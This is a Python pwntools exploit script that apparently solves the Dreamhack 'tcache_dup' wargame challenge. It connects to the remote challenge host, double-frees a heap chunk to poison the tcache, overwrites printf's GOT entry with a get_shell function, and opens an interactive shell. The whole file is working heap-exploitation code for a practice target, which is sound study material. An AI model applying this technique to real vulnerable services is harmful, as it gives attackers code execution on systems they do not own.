# 
from pwn import *

# p = process('./tcache_dup')

p = remote('host3.dreamhack.games',12857)
e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendafter(b'Data: ', data)
    
def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    
    
get_shell = e.symbols['get_shell']
got_printf = e.got['printf']
# Allocate and free a chunk of size 0x40 (chunk A)
# tcache[0x40]: chunk A
create(0x30, b'dreamhack')
delete(0)

# Free chunk A again, bypassing the DFB mitigation
# tcache[0x40]: chunk A -> chunk A -> ...
delete(0)

# tcache[0x40]: chunk A -> printf
create(0x30, p64(got_printf))

# tcache[0x40]: printf
create(0x30, b'B'*8)

# got@printf = address 'get_shell'
create(0x30, p64(get_shell))

p.interactive()


